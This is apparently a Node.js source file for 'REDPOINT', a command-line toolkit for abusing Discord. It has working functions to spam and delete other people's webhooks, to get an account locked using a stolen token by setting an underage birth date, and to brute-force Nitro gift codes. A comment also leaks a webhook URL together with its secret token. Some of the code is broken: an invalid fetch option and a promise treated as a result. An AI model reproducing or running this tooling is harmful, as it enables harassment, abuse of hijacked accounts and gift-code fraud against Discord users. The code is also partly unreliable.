/* imports & stuff */
import https from "https"
import { Webhook } from "discord-webhook-node";
import fetch from "node-fetch";
import readline from "readline";
import { stdin as input, stdout as output } from 'node:process';
const rl = readline.createInterface({ input, output });
/* globals & funcs */
//testing webhook: https://discord.com/api/webhooks/912467556084899870/-0Db2ZiTzZ3ppI_wc5gB0grTSuNH99W5ipk5uXhWO-B-AMtapByS6Yuk9zTQOLvVRZLc
let BLACK = "\x1b[1;30m";
let RED = "\x1b[1;31m";
let GREEN = "\x1b[1;32m";
let YELLOW = "\x1b[1;33m";
let BLUE = "\x1b[1;34m";
let MAGENTA = "\x1b[1;35m";
let CYAN = "\x1b[1;36m";
let WHITE = "\x1b[1;37m";
let RESET = "\x1b[1;0m";
function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}
function clearscr() {
  console.clear();
}

function help() {
  console.log("\n");
  console.log(`${MAGENTA}USABLE COMMANDS: \n`);
  console.log(`${MAGENTA}1)${WHITE} exit ${BLUE} | ${GREEN} exits the program | ${CYAN} Syntax: None`);
  console.log(`${MAGENTA}2)${WHITE} clear ${BLUE} | ${GREEN} clears the screen | ${CYAN} Syntax: None`);

  console.log(`${MAGENTA}3)${BLUE} spam webhook ${BLUE} | ${GREEN} spams a discord webhook | ${CYAN} Syntax: spam webhook <URL> <number> <message>`);
  console.log(`${MAGENTA}4)${BLUE} delete webhook ${BLUE} | ${GREEN} deletes a discord webhook | ${CYAN} Syntax: delete webhook <URL>`);
  console.log(`${MAGENTA}5)${BLUE} userid lookup ${BLUE} | ${GREEN} gets info on a discord userid | ${CYAN} Syntax: userid lookup <ID>`);
  console.log(`${MAGENTA}6)${BLUE} disable token ${BLUE} | ${GREEN} deletes a discord account by token | ${CYAN} Syntax: disable token <token>`);
  console.log(`${MAGENTA}7)${BLUE} token checker ${BLUE} | ${GREEN} looks for working tokens in a file`);
  console.log(`${MAGENTA}8)${BLUE} nitro gen ${BLUE} | ${GREEN} generates random nitro codes and checks them | ${CYAN} Syntax: token gen <webhook you want to send the valid code to>`);
  console.log(`${MAGENTA}9)${BLUE} colored codeblock ${BLUE} | ${GREEN} generates a discord codeblock; with color!`);

  console.log(`${MAGENTA}10)${RED} clone webpage ${BLUE} | ${GREEN} command-line "view source"`);
  console.log(`${MAGENTA}11)${RED} ip lookup ${BLUE} | ${GREEN} gets information for an Ipv4 address`);
  console.log(`${MAGENTA}12)${RED} image search ${BLUE} | ${GREEN} finds similar images based on a url`);
  console.log(`${MAGENTA}13)${RED} cryptos ${BLUE} | ${GREEN} fetches current XMR, BTC, & ETH prices`);
  console.log(`${MAGENTA}14)${RED} make paste ${BLUE} | ${GREEN} makes a https://pastie.io/ paste | ${CYAN} Syntax: make paste <paste here>`);

  console.log(RESET);
}

function welcome(){
  let welcomestr = "\n\n R   E   D   P   O   I   N   T\n\n";
  clearscr();
  console.log(`${RED}${welcomestr}${MAGENTA}\n\n[run "help" for a list of commands.]${RED}`);
  console.log("\n\n");
}
async function deleteWebhook(URL){
await fetch(URL, {
method: "DELETE"
})
return "webhook deleted successfully";
}
async function spam_webhook(URL, times, message){
  console.log(`${RED}attempting to spam...`);
const hook = new Webhook(URL);
//console.log(hook)
  for (let i = 0; i < times; i++){
    hook.send(`${message}`)
}
return `${BLUE}done spamming!${RED}`;
};
async function fetchUser(id){
  const response = await fetch(`https://discordid.13-05.repl.co/api/${id}`)
  if (!response.ok) throw new Error(`Error status code: ${response.status}`)
console.log(`${MAGENTA} ${JSON.stringify(await response.json(), null, 2)}`)
  return "User information fetched!"
}
async function mfaGenerator(){
const characters ='abcdefghijklmnopqrstuvwxyz0123456789';
const length = 8;
  let result = ' ';
      const charactersLength = characters.length;
      for ( let i = 0; i < length; i++ ) {
          result += characters.charAt(Math.floor(Math.random() * charactersLength));
      }
return `${result}`;
}
function nitroGenerator(){
  const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  const length = 16;
    let nitroCode = ' ';
        const charactersLength = characters.length;
        for ( let i = 0; i < length; i++ ) {
            nitroCode += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return `${nitroCode}`;
}
async function nitro(codes){
let nitroCode = nitroGenerator()
for (let i = 0; i < codes; i++){
sleep(3000)
sleep(1000)
let e22z = await fetch(`https://discordapp.com/api/v9/entitlements/gift-codes/${nitroCode}`)
  console.log(e22z.status)
if (e22z.status == 200) {
  return `${nitroCode}`;}
  if (e22z.status == 429) {
          console.log(`Hitting a ratelimit, trying again soon`)
        sleep(5000)
      sleep(5000)}
}}
async function disableToken(token){
console.log(`attempting to disable token`)
await fetch(`https://discord.com/api/v9/users/@me`, {
  method: "PATCH",
      headers: {
        Authorization: `${token}`
      },
    payload: {
      date_of_birth: "2022-1-1"
    }
    })
return "token disabled successfully";
}
async function pasteIO(content){
let response = await fetch("https://pastie.io/documents", {
    "headers": {
      "accept": "application/json, text/javascript, */*; q=0.01",
      "accept-language": "en-US,en;q=0.9",
      "content-type": "text/plain; charset=UTF-8",
      "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-requested-with": "XMLHttpRequest"
    },
    "referrer": "https://pastie.io/",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": content,
    "method": "POST",
    "mode": "cors",
    "credentials": "omit"
  });
return response.json();
}
async function main(){
rl.question('Please enter a command: ', (answer) => {
  if (answer == `exit`){
console.log(`exiting...`)
return process.exit()
  }
  if (answer == `help`){
  help();
  } else if (answer == `clear`){
  clearscr();
} else if (answer.startsWith(`spam webhook`)){
var args = answer.split(' ');
let number = parseInt(args[3])
spam_webhook(args[2], number, args[4]).then(console.log).catch(console.err)
} else if (answer.startsWith(`userid lookup`)){
var args = answer.split(' ');
if (!args[2]) throw "please specify a user ID to look up";
let id = args[2]
fetchUser(id).then(console.log).catch(console.err)
} else if (answer.startsWith(`disable token`)){
var args = answer.split(' ');
let token = args[2]
disableToken(token).then(console.log).catch(console.err)
} else if (answer.startsWith(`delete webhook`)){
  var args = answer.split(' ');
  let URL = args[2]
deleteWebhook(URL).then(console.log).catch(console.err)
} else if (answer.startsWith(`nitro gen`)){
  console.log(`generating nitro codes...`)
  var args = answer.split(' ');
  let webhook = args[2]
  const hook = new Webhook(webhook);
let check = nitro(10000);
if (check) {hook.send(`${check}`)}
} else if (answer.startsWith(`make paste`)){
  var args = answer.split(' ');
  let content = answer.split(' ').slice(2).join(' ');
  //let content = args[2]
  pasteIO(content).then(console.log).catch(console.err)
}
rl.pause()
});
return "command executed";
}
welcome();
nitro()
main().then(console.log()).catch(console.err)
rl.on('pause', () => {
rl.resume()
main().then(console.log()).catch(console.err)
});
